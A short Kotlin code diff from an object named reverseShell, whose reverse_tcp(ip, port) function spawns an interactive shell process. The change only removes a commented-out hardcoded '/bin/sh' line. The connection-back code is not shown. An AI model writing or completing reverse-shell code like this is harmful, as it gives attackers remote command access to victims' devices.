@@ -8,7 +8,6 @@ object reverseShell {
     fun reverse_tcp(ip: String?, port: Int) {
         try {
             val shellPath = getShellPath()
-//            val str = arrayOf("/bin/sh", "-i")
             val str = arrayOf(shellPath, "-i")
             val shellProcess = Runtime.getRuntime().exec(str)
             val processInput = shellProcess.inputStream
